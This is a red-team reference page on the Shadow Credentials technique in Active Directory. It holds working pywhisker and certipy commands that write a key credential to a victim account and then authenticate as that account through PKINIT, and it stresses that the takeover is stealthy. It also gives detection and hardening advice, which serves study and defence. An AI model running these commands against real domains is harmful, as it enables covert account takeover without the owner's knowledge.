---
title: "Shadow Credentials"
category: "red-team"
tags: ["active-directory", "credential-access", "adcs", "kerberos"]
platform: "windows"
mitre: ["T1556"]
difficulty: "advanced"
updated: "2026-07-12"
author: "core"
---

# Shadow Credentials

## TL;DR
If you can write to a target's `msDS-KeyCredentialLink` attribute, you can add your own key-pair as an alternate credential and then authenticate as that account via Kerberos PKINIT — a stealthy, persistent takeover that doesn't reset the password. Requires an AD CS / PKINIT-capable environment.

## Requirements
```text
- Write access to the target's msDS-KeyCredentialLink (e.g. GenericWrite/GenericAll on the object).
- A functioning PKINIT environment (AD CS with the KDC able to do certificate auth).
Common sources of write access: delegated rights, ACL misconfig (find via BloodHound).
```

## Attack
```bash
# Whisker (Windows) / pyWhisker (Linux) – add a key credential to the target
pywhisker -d corp.local -u attacker -p 'Pass' --target victim --action add
# -> outputs a certificate (PFX) you can use to authenticate as `victim`

# Use the cert to get a TGT / NT hash via PKINIT
certipy auth -pfx victim.pfx -dc-ip 10.10.10.10
# or: gettgtpkinit.py + getnthash to recover the NT hash
```

## Why it's powerful
```text
- No password reset (stealthier than ForceChangePassword; the user notices nothing).
- Persistent alternate credential until the attribute is cleaned.
- Turns a GenericWrite edge into full account takeover (incl. computer accounts / DCs).
```

## Detection (Blue Team)
```text
- Event 5136 (directory object modified) on msDS-KeyCredentialLink — high-signal, rare legitimately
  (mostly Windows Hello for Business enrollments).
- Certificate authentication (PKINIT) for accounts that shouldn't use it.
- Correlate KeyCredentialLink writes with the writer's identity.
```

## Mitigation / Hardening
- Audit and minimize write access to user/computer objects (GenericWrite/GenericAll — BloodHound).
- Monitor `msDS-KeyCredentialLink` changes (5136); alert on non-WHfB writes.
- Protect Tier 0; secure AD CS (see [adcs-esc](./adcs-esc.md)); Protected Users group.
- Related: [bloodhound](./bloodhound.md), [ntlm-relay](./ntlm-relay.md), [dcsync](./dcsync.md).

## Sources
- [pyWhisker](https://github.com/ShutdownRepo/pywhisker) · [SpecterOps – Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)
